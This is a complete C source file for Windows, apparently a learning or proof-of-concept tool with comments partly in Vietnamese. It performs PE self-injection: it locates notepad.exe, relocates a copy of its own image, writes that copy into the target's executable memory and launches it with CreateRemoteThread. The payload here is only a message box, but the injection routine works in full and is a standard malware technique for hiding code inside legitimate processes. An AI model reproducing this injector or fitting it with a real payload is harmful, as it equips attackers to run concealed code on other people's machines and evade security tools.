#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

DWORD InjectionEntryPoint()
{
	MessageBox(NULL, L"Hello", L"PE Injector", MB_OKCANCEL);
	return 0;
}

// Tim PID theo ten
DWORD find_process_id(const wchar_t* process_name) {
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE)
		return 0;

	if (Process32First(hSnap, &pe32)) {
		do {
			if (_wcsicmp(pe32.szExeFile, process_name) == 0) {
				CloseHandle(hSnap);
				return pe32.th32ProcessID;
			}
		} while (Process32Next(hSnap, &pe32));
	}

	CloseHandle(hSnap);
	return 0;
}

int main()
{
	DWORD pid = find_process_id(L"notepad.exe");
	if (pid == 0) {
		printf("Khong tim thay notepad.exe\n");
		return 1;
	}
	printf("Tim thay notepad.exe voi PID: %lu\n", pid);

	// lay base address
	PVOID imageBase = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

	// Tao mot vung nho moi va copy PE image vao do
	PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
	memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

	// Lay handle cua process muc tieu
	HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid);

	// Allote a new memory block in the target process. This is where we will be injecting this PE
	PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Calculate delta between addresses of where the image will be located in the target process and where it's located currently
	DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;

	// Relocate localImage, to ensure that it will have correct addresses once its in the target process
	PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	DWORD relocationEntriesCount = 0;
	PDWORD_PTR patchedAddress;
	PBASE_RELOCATION_ENTRY relocationRVA = NULL;

	while (relocationTable->SizeOfBlock > 0)
	{
		relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
		relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

		for (short i = 0; i < relocationEntriesCount; i++)
		{
			if (relocationRVA[i].Offset)
			{
				patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
				*patchedAddress += deltaImageBase;
			}
		}
		relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
	}

	// Write the relocated localImage into the target process
	WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);

	// Start the injected PE inside the target process
	CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + deltaImageBase), NULL, 0, NULL);

	return 0;
}